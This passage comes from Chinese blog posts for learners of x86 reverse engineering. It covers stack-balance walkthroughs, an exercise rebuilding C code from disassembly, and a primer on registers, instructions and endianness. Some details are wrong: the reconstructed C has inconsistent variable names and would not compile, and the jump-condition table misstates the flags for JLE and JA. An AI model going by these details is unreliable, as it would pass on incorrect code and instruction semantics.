EAX，DWORD PTR SS：[EBP+8] ADD EAX，DWORD PTR SS：[EBP+C] 上述代码含义为，取EBP+8所得到的地址的值，赋值给EAX，接着取EBP+C得到的地址的值，与EAX的值相加，赋值给EAX 我们根据上述的堆栈图，可以看到EBP+8就是1，EBP+C就是2，所以上述步骤的含义就是EAX=1+2=3 接着我们F8验证一番 可以看到上图右上角EAX变为3，紧接着是pop edi，pop esi，pop ebx 对应于堆栈图，这里就是将EDI，ESI，EBX的值放到寄存器中 堆栈图如上，验证如下： 如上图我们看到ESP的值成功-12到E98的值 随后又mov esp，ebp，这里是将ebp的值赋值给esp，也就是上述堆栈图中的CC一串数据没了，堆栈图如下： 验证如下： 可以看到ESP与EBP的值一致（这个过程叫做恢复堆栈），至于函数执行完在堆栈里面的值就不要了，所以就会产生数据垃圾 这里做一下修改，因为CC这串垃圾数据是依旧存在的，所以堆栈图应该是这样的： 如上图，可以看到CC一串数据依旧存在，最后是pop ebp，将ebp出栈 执行完我们看到上图中EBP的值恢复原样，恢复了原来的栈底（可以对比文章开头的） 最后进行了ret，不过看其他文章这里是RETN，其本质是pop eip，也就是我们最开始call调用函数的地方，即将eip的值出栈，eip：401171，这个地址就是我们的函数返回地址，这里执行完之后，堆栈图应该如下： 验证如下： 上图所示，EIP的值恢复了4001171，到目前为止我们就达到了堆栈平衡： 堆栈平衡：调用函数之前和调用函数之后你的堆栈应该是一样的，是没有变化的，我们叫做堆栈平衡 ADD ESP，8 我们在外面维持了堆栈平衡，我们把这个叫做外平栈。 完结撒花！ 0x02 还原C代码 这里逆向的师傅给了我一个小练习，将汇编指令还原为C代码，内容如下： ;test1 .text:000011B1 var_4= dword ptr -4 .text:000011B1 arg_0= dword ptr 8 .text:000011B1 55 push ebp .text:000011B2 89 E5 mov ebp, esp .text:000011B4 83 EC 10 sub esp, 10h .text:000011C1 C7 45 FC 00 00 00 00 mov [ebp+var_4], 0 .text:000011C8 83 7D 08 00 cmp [ebp+arg_0], 0 .text:000011CC 79 09 jns short loc_11D7 .text:000011CC .text:000011CE C7 45 FC 01 00 00 00 mov [ebp+var_4], 1 .text:000011D5 EB 34 jmp short loc_120B .text:000011D5 .text:000011D7 loc_11D7: .text:000011D7 83 7D 08 00 cmp [ebp+arg_0], 0 .text:000011DB 75 09 jnz short loc_11E6 .text:000011DB .text:000011DD C7 45 FC 02 00 00 00 mov [ebp+var_4], 2 .text:000011E4 EB 25 jmp short loc_120B .text:000011E4 .text:000011E6 loc_11E6: .text:000011E6 83 7D 08 1D cmp [ebp+arg_0], 1Dh .text:000011EA 7F 09 jg short loc_11F5 .text:000011EA .text:000011EC C7 45 FC 03 00 00 00 mov [ebp+var_4], 3 .text:000011F3 EB 16 jmp short loc_120B .text:000011F3 .text:000011F5 loc_11F5: .text:000011F5 83 7D 08 45 cmp [ebp+arg_0], 45h .text:000011F9 7F 09 jg short loc_1204 .text:000011F9 .text:000011FB C7 45 FC 04 00 00 00 mov [ebp+var_4], 4 .text:00001202 EB 07 jmp short loc_120B .text:00001202 .text:00001204 loc_1204: .text:00001204 C7 45 FC 05 00 00 00 mov [ebp+var_4], 5 .text:00001204 .text:0000120B loc_120B: .text:0000120B 8B 45 FC mov eax, [ebp+var_4] .text:0000120E C9 leave .text:0000120F C3 retn ;main .text:00001221 6A 3C push 3Ch .text:00001223 E8 85 FF FF FF call test1 .text:00001228 83 C4 04 add esp, 4 这里只要我们在画堆栈平衡中用心了，看这里也不会费事的，遇到不常用的指令搜索即可。 首先我这里的思路就是先找main函数入口，如上图所示。那第一步这里是push 3Ch。也就是3Ch入栈，这里的h代表十六进制而已。 之后call指令调用test1函数，那我们接下来找寻test1的入口 如上图，前面两个指令我专门问了一下GPT： var_4= dword ptr -4 arg_0= dword ptr 8 在汇编语言中，dword ptr 表示 “double word pointer”，表示一个双字（32位）指针。而 -4 和 8 是相对于基址指针 ebp 的偏移量。 var_4= dword ptr -4 表示在当前堆栈帧中，var_4 是一个双字（32位）变量，相对于基址指针 ebp 的偏移量为 -4。这意味着在堆栈上，var_4 存储在 ebp - 4 的位置。 arg_0= dword ptr 8 表示在当前堆栈帧中，arg_0 是一个双字（32位）参数，相对于基址指针 ebp 的偏移量为 8。这意味着在堆栈上，函数参数 arg_0 存储在 ebp + 8 的位置。 总体来说，这两个定义告诉我们在函数的堆栈帧中如何访问 var_4 和 arg_0 这两个变量。 基于上述阐述，我们不难理解，这里的var_4与arg_0的地址一定是EBP当前的地址-4与+8。 之后的这两个步骤意思是，将当前esp的值赋值给ebp，也就是说此刻，ebp（也就是栈底）减少了，减少至与esp位置一致。 而sub指令则是进行esp-10h的操作，在这里10是十六进制，那10进制就是16，也就是将esp进行-16，那到这里ebp与esp便不再同一位置，那他们之间的距离则是为了在下面程序执行时，分配内存空间的作用（这里我们在上面堆栈图也学习过）即缓冲区。 接下来的 这里的意思是，将0赋值给var_4也就是ebp偏移量为-4的位置，即此刻var_4的值为0 这里我们搜索一下cmp指令的含义： cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。cmp指令执行后，将对标志寄存器产生影响。其他相关指令通过识别这些被影响的标志寄存器位来得知比较结果。 cmp 指令格式： cmp 操作对象1, 操作对象2 功能： 操作对象1 - 操作对象2 计算操作对象1 - 操作对象2但并不保存结果，仅仅根据计算结果对标志寄存器进行设置。 也就是说这里的cmp是将arg_0与0进行比较 这里我们需要结合jns指令来看，先理解一下jns指令含义：这里我感觉是写错了，搜了几篇文章发现jns是当非负数的时候即可跳转 也就是说如果我们arg_0&gt;=0（为非负数）则执行下列的jns命令跳转到jns所指定的目标地址上，如上图所示也就是11D7位置。 若我们的arg_0&lt;0，那var_4则会被赋值为1，之后继续跳转到指定位置：120B；若我们成功执行jns指令，那我们则会继续执行arg_0与0的比较 在jnz指令作用下，如果我们的arg_0!=0，则会跳转到指定位置11E6，否则var_4则会被赋值为2，接着跳转到指定位置：120B； 地址11E6： 如上图所示，在11E6处进行了arg_0与1Dh的比较， 那如果我们此时arg_0&gt;1Dh则会跳转到jg指定位置：11F5，否则将var_4赋值为3，接着跳转到120B。 这里呢在11F5处，依旧是如果arg_0&gt;45h，则跳转到指定位置：1204，否则将var_4赋值为4，接着跳转到120B。 最后在1204地址处，直接将var_4赋值为5，接着执行leave，retn。 这里呢问了GPT说是，leave作用是恢复先前的堆栈帧，retn则是返回到当初call指令调用地址处 最后add esp，4，也就是esp=esp+4，这里也就是为了将使用过的字节（内存空间）全部回收，清理堆栈。 综上所述，我们尝试编写一波C代码： #include&lt;stdio.h&gt; int test1(int a){ int var_4 = 0 if(arg_0 &lt; 0){ var_4 = 1; } else if(arg_0 == 0){ var_4 = 2; }else if(arg_0 &lt;= 1Dh){ var_4 = 3; }else if(arg_4 &lt;= 45h){ var_4 = 4; }else{ var_4 = 5; } return var_4; } int main(){ test1(3Ch); return 0; } 不过与原函数对比发现，这里似乎变量的名字我们无法得知，另外就是 0x03 总结 这次堆栈平衡花了三天时间，但前两天各种琐事以及软件配置问题导致我迟迟没有开始，今晚好不容易有了时间，就花了2小时完成。 总的来说困难不是很大（或许是我跟着教程走的缘故吧）不过还是很有收获的，回顾之前发布的汇编指令那一篇文章，了你给我头疼不已，虽然大概可以看懂，但还是缺了很多东西，这回也是在reverse方向师傅的建议下，尝试画堆栈图，这似乎让我收获很大。 0x04 参考文章 画堆栈图1 逆向学习之画堆栈图一","tags":["reverse系列"],"categories":["reverse"]},{"title":"汇编基础指令","path":"/2023/11/19/hui-bian-ji-chu-zhi-ling/","content":"0x01 什么是汇编语言 汇编语言是最接近机器语言的编程语言，引用百科中的一段话解释为： 汇编语言（assembly language）是一种用于电子计算机、微处理器、微控制器或其他可编程器件的低级语言，亦称为符号语言。在汇编语言中，用助记符代替机器指令的操作码，用地址符号或标号代替指令或操作数的地址。汇编语言又被称为第二代计算机语言。 1.1 汇编语言产生的原因 对于绝大多数人来说，二进制程序是不可读的，当然有能人可以读，比如第一代程序员，但这类人快灭绝了，直接看二进制不容易看出来究竟做了什么事情，比如最简单的加法指令二进制表示为 00000011，如果它混在一大串01字符串中就很难把它找出来，所以汇编语言主要就是为了解决二进制编码的可读性问题。 1.2 汇编与二进制的关系 换句话来说，汇编语言就是把给机器看的二进制编码翻译成人话，汇编指令是机器指令的助记符，与机器指令是一一对应的关系，是一种便于阅读和记忆的书写格式。有效地解决了机器指令编写程序难度大的问题，并且使用编译器，可以很方便的把汇编程序转译成机器指令程序，比如之前提到的 00000011 加法指令，对应的汇编指令是 ADD，在调用汇编器时就会把 ADD 翻译成 00000011。 0x02 寄存器 说到汇编指令不得不提到寄存器，寄存器本身是用来存数据的，因为 CPU 本身只负责逻辑运算，数据需要单独储存在其他的地方，但是对于不熟悉寄存器的人来说会有疑惑，数据不是存在硬盘上吗？或者说数据不是存在内存中吗？这些想法都没错，那么寄存器是用来做什么的呢？ 2.1 寄存器作用 其实硬盘、内存都是用来存储数据的，但是 CPU 的运算速度远高于内存的读写速度，更不用说从硬盘上取数据了，所以为了避免被拖慢速度影响效率，CPU 都自带一级缓存和二级缓存，一些 CPU 甚至增加了三级缓存，从这些缓存中读写数据要比内存快很多，但是还是无法使用飞速运转的 CPU，所以才会有寄存器的存在。 寄存器不是后来增加的，在最初的计算中就已经设计出来，相比而言，多级缓存出现的更晚一些，通常那些最频繁读写的数据都会被放在寄存器里面，CPU 优先读写寄存器，再通过寄存器、缓存跟内存来交换数据，达到缓冲的目的，因为可以通过名称访问寄存器，这样访问速度是最快的，因此也被称为零级缓存。 2.2 存取速度比较 通过上面的叙述我们可以知道存取速度从高到低分别是: 寄存器 &gt; 1级缓存 &gt; 2级缓存 &gt; 3级缓存 &gt; 内存 &gt; 硬盘，关于它们的存取速度，举个例子很容易就能明白了，比如我们做菜（CPU工作）时，取手中（寄存器）正拿着的肉和蔬菜肯定是最快的，如果没有就需要把案板上（1级缓存）处理好的菜拿过来，如果案板上没有就在更远一点的洗菜池（2级缓存）中找一找，还没找到的话就要到冰箱（3级缓存）中看一看了，这时发现家里真没有，那去楼下的菜店（内存）去买点吧，转了一圈发现没有想要的，最后还是开车去农贸市场（硬盘）买吧。 通过上面这个例子应该能明白它们的速度关系了，既然缓存这么快，为什么不用缓存代替内存，或者将2、3级缓存都换成1级缓存呢？这里边有一个成本问题，速度越快对应着价格越高，如果你买过机械硬盘和固态硬盘应该很容易就理解了。 2.3 寄存器分类 常用的 x86 CPU 寄存器有8个：EAX 、EBX、ECX、EDX、EDI、ESI、EBP、ESP，据说现在寄存器总数已经超过100个了，等我找到相关资料再来补充，上面这几个寄存器是最常用的，这些名字也常常出现在汇编的代码中。 其中AX、BX、CX、DX是通用寄存器，存放一般性数据。1个16位寄存器可以存储16位的数据。 为了向上一代CPU兼容，这4个寄存器可以分为AH、AL，BH、BL，CH、CL，DH、DL。 我们常说的32位、64位 CPU 是指数据总线的宽度或根数，而寄存器是暂存数据和中间结果的单元，因此寄存器的位数也就是处理数据的长度与数据总线的根数是相同的，所以32位 CPU 对应的寄存器也应该是32位的。 2.4 常用寄存器用途 上面提到大8个寄存器都有其特定的用途，我们以32位 CPU 为例简单说明下这些寄存器的作用，整理如下表： 寄存器 含义 用途 包含寄存器 EAX 累加(Accumulator)寄存器 常用于乘、除法和函数返回值 AX(AH、AL) EBX 基址(Base)寄存器 常做内存数据的指针, 或者说常以它为基址来访问内存. BX(BH、BL) ECX 计数器(Counter)寄存器 常做字符串和循环操作中的计数器 CX(CH、CL) EDX 数据(Data)寄存器 常用于乘、除法和 I/O 指针 DX(DH、DL) ESI 来源索引(Source Index)寄存器 常做内存数据指针和源字符串指针 SI EDI 目的索引(Destination Index)寄存器 常做内存数据指针和目的字符串指针 DI ESP 堆栈指针(Stack Point)寄存器 只做堆栈的栈顶指针; 不能用于算术运算与数据传送 SP EBP 基址指针(Base Point)寄存器 只做堆栈指针, 可以访问堆栈内任意地址, 经常用于中转 ESP 中的数据, 也常以它为基址来访问堆栈; 不能用于算术运算与数据传送 BP 2.5 寄存器EAX、AX、AH、AL的关系 在上面的图标中每个常用寄存器后面还有其他的名字，它们是同一个寄存器不同用法下的不同名字，比如在32位 CPU 上，EAX是32位的寄存器，而AX是EAX的低16位，AH是AX的高8位，而AL是AX的低8位，它们的对照关系如下: 00000000 00000000 00000000 00000000 |===============EAX===============|---4个字节 |======AX=======|---2个字节 |==AH===|-----------1个字节 |===AL==|---1个字节 2.6 物理地址 CPU要想访问内存单元，就要给出内存单元的物理地址，内存是一个一维的线性空间，每一个内存单元都有唯一的地址，这个地址就是物理地址。 8086CPU是16位结构的，其数据总线是16位宽，但地址总线是20位，1MB寻址能力。 但内部是16位结构，内部一次性处理、传输地址为16位，所以在内部采用2个16位地址合成方式形成一个20位的物理地址进行内存寻址。 物理地址 = 段地址 * 16 + 偏移地址(段地址*16即左移4位) 其本质含义是：CPU在访问内存时，用一个基础地址(段地址*16)和相对于基础地址的偏移地址相加，得到物理地址。 由于偏移地址为16位，16位地址的寻址能力是64KB，所以一个段的长度最大为64K。 CPU可以用不同的段地址和偏移地址形成同一个物理地址。 2.7 段寄存器 8086CPU有4个段寄存器：CS、DS、SS、ES。 CS为代码段寄存器，IP为指令指针寄存器。 任意时刻，CPU将CS:IP指向的内容当做当前指令执行。 8086CPU工作过程： 从CS:IP指向的内存单元读指令，指令进指令缓冲器 IP指向下一条指令 执行指令，跳到步骤1，重复这个过程 CPU根据什么将内存中的信息看做指令？答案是CPU将CS:IP指向的内存单元的内容看做指令。 使用jmp 段地址:偏移地址或jmp 寄存器修改CS:IP或IP的地址。 在编程时，根据需要可以将长度为N的一组代码，存在一组连续的内存单元中，这段内存单元叫做代码段。 同样的，可以根据需要将长度为N的一组内存单元，专门存储数据，这段内存单元叫做数据段。 8086CPU自动取DS寄存器中的数据为内存单元的段地址。 例如mov [0] cs表示将寄存器cs的值复制到段地址为DS偏移地址为0的内存单元中。 字在内存中存储时，用2个地址连续的内存单元存放，字的低字节放在低地址单元，高字节放在高地址单元。 2.8 标志寄存器 标志寄存器作用： 存储相关指令某些执行结果 为CPU执行相关指令提供行为依据 控制CPU相关工作方式 8086CPU中有个叫flag寄存器，共16位，每一位代表专门的含义： 第6位ZF，零标志位：相关指令执行后，结果为0则zf=1，不为0则zf=0 第2位PF，奇偶标志位：相关指令执行后，结果所有bit位中1的个数为偶数，pf=1，否则pf=0 第7位SF，符号标志位：相关指令执行后，结果是否为负，结果为负sf=1，否则sf=0 第0位CF，进位标志位：对于无符号数运算，CF记录运算结果最高有效位向更高位的进位值/借位值 第11位OF，溢出标志位：对于有符号数运算，是否发生溢出，溢出则of=1，否则of=0 第10位DF，方向标志位：在串处理指令中，控制操作后si、di增减，df=0每次操作后si、di递增，否则递减 0x03 内存模型：Heap 寄存器只能存放很少量的数据，大多数时候，CPU 要指挥寄存器，直接跟内存交换数据。所以，除了寄存器，还必须了解内存怎么储存数据。 程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从0x1000到0x8000，起始地址是较小的那个地址，结束地址是较大的那个地址。 程序运行过程中，对于动态的内存占用请求（比如新建对象，或者使用malloc命令），系统就会从预先分配好的那段内存之中，划出一部分给用户，具体规则是从起始地址开始划分（实际上，起始地址会有一段静态数据，这里忽略）。举例来说，用户要求得到10个字节内存，那么从起始地址0x1000开始给他分配，一直分配到地址0x100A，如果再要求得到22个字节，那么就分配到0x1020。 这种因为用户主动请求而划分出来的内存区域，叫做 Heap（堆）。它由起始地址开始，从低位（地址）向高位（地址）增长。Heap 的一个重要特点就是不会自动消失，必须手动释放，或者由垃圾回收机制来回收。 0x04 内存模型：Stack 除了 Heap 以外，其他的内存占用叫做 Stack（栈）。简单说，Stack 是由于函数运行而临时占用的内存区域。 请看下面的例子。 int main() { int a = 2; int b = 3; } 上面代码中，系统开始执行main函数时，会为它在内存里面建立一个帧（frame），所有main的内部变量（比如a和b）都保存在这个帧里面。main函数执行结束后，该帧就会被回收，释放所有的内部变量，不再占用空间。 如果函数内部调用了其他函数，会发生什么情况？ int main() { int a = 2; int b = 3; return add_a_and_b(a, b); } 上面代码中，main函数内部调用了add_a_and_b函数。执行到这一行的时候，系统也会为add_a_and_b新建一个帧，用来储存它的内部变量。也就是说，此时同时存在两个帧：main和add_a_and_b。一般来说，调用栈有多少层，就有多少帧。 等到add_a_and_b运行结束，它的帧就会被回收，系统会回到函数main刚才中断执行的地方，继续往下执行。通过这种机制，就实现了函数的层层调用，并且每一层都能使用自己的本地变量。 所有的帧都存放在 Stack，由于帧是一层层叠加的，所以 Stack 叫做栈。生成新的帧，叫做\"入栈\"，英文是 push；栈的回收叫做\"出栈\"，英文是 pop。Stack 的特点就是，最晚入栈的帧最早出栈（因为最内层的函数调用，最先结束运行），这就叫做\"后进先出\"的数据结构。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。 Stack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。比如，内存区域的结束地址是0x8000，第一帧假定是16字节，那么下一次分配的地址就会从0x7FF0开始；第二帧假定需要64字节，那么地址就会移动到0x7FB0。 8086CPU提供入栈和出栈的指令：PUSH和POP，任意时刻，寄存器SS:SP指向栈顶元素。 push指令执行： SP=SP-2 向SS:SP指向的字单元送入数据 pop指令执行： 从SS:SP指向的字单元读数据 SP=SP+2 在编程时，要时刻注意栈顶越界的问题，用栈来可以暂存以后需要恢复的寄存器中的内容。 push和pop实质上是一种内存传送指令，同样的，编程时我们可以将长度为N的一组连续内存单元当做栈空间使用，叫做栈段。 一个栈段的容量最大为64KB。 0x05 CPU 指令 5.1 实例 了解寄存器和内存模型以后，就可以来看汇编语言到底是什么了。下面是一个简单的程序example.c。 int add_a_and_b(int a, int b) { return a + b; } int main() { return add_a_and_b(2, 3); } gcc 将这个程序转成汇编语言。 $ gcc -S example.c 上面的命令执行以后，会生成一个文本文件example.s，里面就是汇编语言，包含了几十行指令。这么说吧，一个高级语言的简单操作，底层可能由几个，甚至几十个 CPU 指令构成。CPU 依次执行这些指令，完成这一步操作。 example.s经过简化以后，大概是下面的样子。 _add_a_and_b: push %ebx mov %eax, [%esp+8] mov %ebx, [%esp+12] add %eax, %ebx pop %ebx ret _main: push 3 push 2 call _add_a_and_b add %esp, 8 ret 可以看到，原程序的两个函数add_a_and_b和main，对应两个标签_add_a_and_b和_main。每个标签里面是该函数所转成的 CPU 运行流程。 每一行就是 CPU 执行的一次操作。它又分成两部分，就以其中一行为例。 push %ebx 这一行里面，push是 CPU 指令，%ebx是该指令要用到的运算子。一个 CPU 指令可以有零个到多个运算子。 下面我就一行一行讲解这个汇编程序，建议读者最好把这个程序，在另一个窗口拷贝一份，省得阅读的时候再把页面滚动上来。 5.2 push 指令 根据约定，程序从_main标签开始执行，这时会在 Stack 上为main建立一个帧，并将 Stack 所指向的地址，写入 ESP 寄存器。后面如果有数据要写入main这个帧，就会写在 ESP 寄存器所保存的地址。 然后，开始执行第一行代码。 push 3 push指令用于将运算子放入 Stack，这里就是将3写入main这个帧。 虽然看上去很简单，push指令其实有一个前置操作。它会先取出 ESP 寄存器里面的地址，将其减去4个字节，然后将新地址写入 ESP 寄存器。使用减法是因为 Stack 从高位向低位发展，4个字节则是因为3的类型是int，占用4个字节。得到新地址以后， 3 就会写入这个地址开始的四个字节。 push 2 第二行也是一样，push指令将2写入main这个帧，位置紧贴着前面写入的3。这时，ESP 寄存器会再减去 4个字节（累计减去8）。 5.3 call 指令 第三行的call指令用来调用函数。 call _add_a_and_b 上面的代码表示调用add_a_and_b函数。这时，程序就会去找_add_a_and_b标签，并为该函数建立一个新的帧。 下面就开始执行_add_a_and_b的代码。 push %ebx 这一行表示将 EBX 寄存器里面的值，写入_add_a_and_b这个帧。这是因为后面要用到这个寄存器，就先把里面的值取出来，用完后再写回去。 这时，push指令会再将 ESP 寄存器里面的地址减去4个字节（累计减去12）。 5.4 mov 指令 mov指令用于将一个值写入某个寄存器。 mov %eax, [%esp+8] 这一行代码表示，先将 ESP 寄存器里面的地址加上8个字节，得到一个新的地址，然后按照这个地址在 Stack 取出数据。根据前面的步骤，可以推算出这里取出的是2，再将2写入 EAX 寄存器。 下一行代码也是干同样的事情。 mov %ebx, [%esp+12] 上面的代码将 ESP 寄存器的值加12个字节，再按照这个地址在 Stack 取出数据，这次取出的是3，将其写入 EBX 寄存器。 5.5 add 指令 add指令用于将两个运算子相加，并将结果写入第一个运算子。 add %eax, %ebx 上面的代码将 EAX 寄存器的值（即2）加上 EBX 寄存器的值（即3），得到结果5，再将这个结果写入第一个运算子 EAX 寄存器。 5.6 pop 指令 pop指令用于取出 Stack 最近一个写入的值（即最低位地址的值），并将这个值写入运算子指定的位置。 pop %ebx 上面的代码表示，取出 Stack 最近写入的值（即 EBX 寄存器的原始值），再将这个值写回 EBX 寄存器（因为加法已经做完了，EBX 寄存器用不到了）。 注意，pop指令还会将 ESP 寄存器里面的地址加4，即回收4个字节。 5.7 ret 指令 ret指令用于终止当前函数的执行，将运行权交还给上层函数。也就是，当前函数的帧将被回收。 ret 可以看到，该指令没有运算子。 随着add_a_and_b函数终止执行，系统就回到刚才main函数中断的地方，继续往下执行。 add %esp, 8 上面的代码表示，将 ESP 寄存器里面的地址，手动加上8个字节，再写回 ESP 寄存器。这是因为 ESP 寄存器的是 Stack 的写入开始地址，前面的pop操作已经回收了4个字节，这里再回收8个字节，等于全部回收。 ret 最后，main函数运行结束，ret指令退出程序执行。 0x06 汇编语言指令 终于说到汇编常用指令了，因为 linux 和 windows 下的汇编语法是有些不同的，所以下面我们先通过 windows 下的汇编指令来简单学习一下，后续再来比较两者的不同。 6.1 数据传送指令 指令 名称 示例 备注 MOV 传送指令 MOV dest, src 将数据从src移动到dest PUSH 进栈指令 PUSH src 把源操作数src压入堆栈 POP 出栈指令 POP dest 从栈顶弹出字数据到dest 6.2 算术运算指令 指令 名称 示例 备注 ADD 加法指令 ADD dest, src 在dest基础上加src SUB 减法指令 SUB dest, src 在dest基础上减src INC 加1指令 INC dest 在dest基础上加1 DEC 减1指令 DEC dest 在dest基础上减1 6.3 逻辑运算指令 指令 名称 示例 备注 NOT 取反运算指令 NOT dest 把操作数dest按位取反 AND 与运算指令 AND dest, src 把dest和src进行与运算之后送回dest OR 或运算指令 OR dest, src 把dest和src进行或运算之后送回dest XOR 异或运算 XOR dest, src 把dest和src进行异或运算之后送回dest 6.4 循环控制指令 指令 名称 示例 备注 LOOP 计数循环指令 LOOP label 使ECX的值减1，当ECX的值不为0的时候跳转至label，否则执行LOOP之后的语句 6.5 转移指令 指令 名称 示例 备注 JMP 无条件转移指令 JMP lable 无条件地转移到标号为label的位置 CALL 过程调用指令 CALL labal 直接调用label JE 条件转移指令 JE lable zf =1 时跳转到标号为label的位置 JNE 条件转移指令 JNE lable zf=0 时跳转到标号为label的位置 6.6 JCC指令组 J是指jump。CC是条件，该条件与EFL标志寄存器中的标志位息息相关。通过获取EFL标志位的值，判断是否满足条件而是否执行JUMP操作。对应了高级语言中的比较运算。 JCC指令 中文含义 检查符号位 典型C应用 JZ/JE 若为0则跳转；若相等则跳转 ZF=1 if (i == j);if (i == 0); JNZ/JNE 若不为0则跳转；若不相等则跳转 ZF=0 if (i != j);if (i != 0); JS 若为负则跳转 SF=1 if (i &lt; 0); JNS 若为非负数则跳转 SF=0 if (i &gt;= 0); JP/JPE 若1出现次数为偶数则跳转 PF=1 (null) JNP/JPO 若1出现次数为奇数则跳转 PF=0 (null) JO 若溢出则跳转 OF=1 (null) JNO 若无溢出则跳转 OF=0 (null) JC/JB/JNAE 若进位则跳转；若低于则跳转；若不高于等于则跳转 CF=1 if (i &lt; j); JNC/JNB/JAE 若无进位则跳转；若不低于则跳转；若高于等于则跳转； CF=0 if (i &gt;= j); JBE/JNA 若低于等于则跳转；若不高于则跳转 ZF=1或CF=1 if (i &lt;= j); JNBE/JA 若不低于等于则跳转；若高于则跳转 ZF=0或CF=0 if (i &gt; j); JL/JNGE 若小于则跳转；若不大于等于则跳转 SF != OF if (si &lt; sj); JNL/JGE 若不小于则跳转；若大于等于则跳转； SF = OF if (si &gt;= sj); JLE/JNG 若小于等于则跳转；若不大于则跳转 ZF != OF 或 ZF=1 if (si &lt;= sj); JNLE/JG 若不小于等于则跳转；若大于则跳转 SF=0F 且 ZF=0 if(si&gt;sj)ag 6.7 堆栈指令 ESP：栈顶指针寄存器，记录当前使用的地址，栈的内存空间是存大地址开始使用的。EBP：栈底指针寄存器，记录栈开始的位置。 我们可以使用MOV指令，将数据MOV到ESP寄存器指定的位置，然后使用SUB或者ADD指令，将ESP寄存器的值偏移对应的数据宽度值，实现数据的入栈和出栈操作。基于这样的原理，汇编中提供了PUSH和POP命令 MOV BYTE PTR DS:[ESP], 0xFF // 向栈中写入一个字节 SUB ESP, 1 // 栈顶指针偏移一字节 以上两个操作等同于一个push操作 PUSH 0xFF // 将0xFF写入到ESP保存的地址处，同时ESP偏移一个数据宽度 PUSH EAX // EAX中的值入栈 PUSH DWORD PTR DS:[地址] // 该地址处的值入栈 出栈同理 POP DWORD　EAX // 将栈顶的元素取出放入EAX寄存器中保存，同时ESP偏移一个DWORD数据宽度 6.8 跳转指令 JMP：将程序跳转到指定的地址执行，通过改变EIP中的值实现 CALL：将程序跳转到指定的地址，跳转前将下一次执行的地址保存到栈中，用来记录跳转前的位置。然后改变EIP中的值使得cpu去执行其他地址的指令。当执行结束需要返回原来的地址时，从栈中取出跳转签到的地址，赋值到EIP寄存器中即可回到跳转前的状态。 RETN：从栈中取出保存的地址，赋值给EIP，用作下次执行 使用这两个指令需要理解EIP寄存器的作用。当一个程序被编译完成之后，程序的执行方法即已经确定，即A=&gt;B=&gt;C的顺序进行执行，且他们使用的内存空间说连续的，计算机执行一行指令后，下一次要执行的内容都保存在EIP寄存器保存的地址处。所以EIP寄存器指向的内容，就是程序下一次执行的指令。也就是说，A执行时，EIP寄存器中保存的是B的地址，这样执行A后将会获取B的信息并执行。如果A是一个JMP或者CALL指令，执行依次JMP EIP D，这条指令表示将EIP中的值改为D的地址，所以下一次执行的即为D指令。由此实现了跳转。这样的方式当程序跳转到D指令后，程序无法返回B指令了，因为我们找不到B的地址，想要重新回到B指令，需要将B的地址保存，使用时取回即可，通常是将其入栈。这样就和CALL指令的使用方式相同了。 JMP EIP, 地址 // 修改EIP寄存器中的值。 CALL　地址 // 跳转到指定地址，执行该地址的指令，跳转前，将下一行地址入栈， 0x07 linux 和 windows 下汇编的区别 前面说到 linux 和 windows 下的汇编语法是不同的，其实两种语法的不同和系统不同没有绝对的关系，一般在 linux 上会使用 gcc/g++ 编译器，而在 windows 上会使用微软的 cl 也就是 MSBUILD，所以产生不同的代码是因为编译器不同，gcc 下采用的是AT&amp;T的汇编语法格式，MSBUILD 采用的是Intel汇编语法格式。 差异 Intel AT&amp;T 引用寄存器名字 eax %eax 赋值操作数顺序 mov dest, src movl src, dest 寄存器、立即数指令前缀 mov ebx, 0xd00d movl $0xd00d, %ebx 寄存器间接寻址 [eax] (%eax) 数据类型大小 操作码后加后缀字母，“l” 32位，“w” 16位，“b” 8位（mov dx, word ptr [eax]） 操作数前面加dword ptr， word ptr，byte ptr的格式 （movb %bl %al） 0x08 什么是字长 ​ 内存以字节为单位。 一个字节是 8 个比特位，可以表示 2^8 = 256 个数。大小为 8 位的二进制数是从 0 开始到 255 这 256 个值中的一个。 两个字节被称为一个字（WORD），两个字被称为四个字节（32位）也即双字（DWORD），四字 （QWORD）是八个字节（64 位）。 这些连续的字节要按什么样的顺序排列和解释，这就涉及到端序的范畴了。 字节的排列方式有两个通用规则: 大端序（Big-Endian）与小端序（Little-Endian） 大端序（Big-Endian）将数据的低位字节存放在内存的高位地址，高位字节存放在低位地址。这种 排列方式与数据用字节表示时的书写顺序一致，符合人类的阅读习惯。 小端序（Little-Endian）将数据的低位字节放在较小的地址处，高位放在较大的地址处。小端序与 人类的阅读习惯相反，但更符合计算机读取内存的方式，因为CPU读取内存中的数据时，是从低地 址向高地址方向进行读取的。 0x09 大端与小端的比较 9.1 概念 字节序指的是，多字节数据的内存排列顺序。这样说比较抽象，使用图形解释就很好懂。 内存好比一排房间，每个字节是一间房。每间房都有门牌号（内存地址），从0号开始，然后是1号、2号… 0号字节的地址小，称为低位内存；3号字节的地址大，称为高位内存。 现在有一个数值abcd要放进这些房间，每个房间放一个数字，那么有两种放法。 第一种放法是，第一位a放在低位地址（0号），最后一位d放在高位地址（3号）。 这种排列称为\"大端序\"（big-endian，简称 BE），即大头在前，因为a是abcd的大头（最重要的数字）。 第二种放法是，第一位a放在高位地址（3号地址），最后一位d放在低位地址（0号地址）。 这种排列称为\"小端序\"（little-endian，简称 LE），即小头d在前。 大端序和小端序合称字节序，这两个名字来自18世纪的英国小说《格列佛游记》。某国分成两派，一派认为鸡蛋应该从大头吃起，称为\"大端派\"；另一派认为，鸡蛋应该从小头吃起，称为\"小端派\"。两派相执不下，谁也无法说服谁，最后甚至为此交战。 9.2 可读性 对于人类来说，不同字节序的可读性是不一样的。大部分国家的阅读习惯是从左到右阅读。 大端序的最高位在左边，最低位在右边，符合阅读习惯。所以，对于这些国家的人来说，从左到右的大端序的可读性更好。 但是现实中，从右到左的小端序虽然可读性差，但应用更广泛，x86 和 ARM 这两种 CPU 架构都采用小端序，这是为什么？ 或者换一种问法，两种不同的字节序为什么会并存，统一规定只使用一种，难道不是更方便吗？ 原因是它们有各自的适用场景，某些场景大端序有优势，另一些场景小端序有优势，下面就逐一分析。 9.3 检查奇偶性 小端序优势最明显的，大概就是检查奇偶性，即通过查看个位数，确定某个数字是奇数还是偶数。 以123456为例，大端序从左到右排列，计算机必须一直读到最后一位的个位数6，才能确定这是偶数。 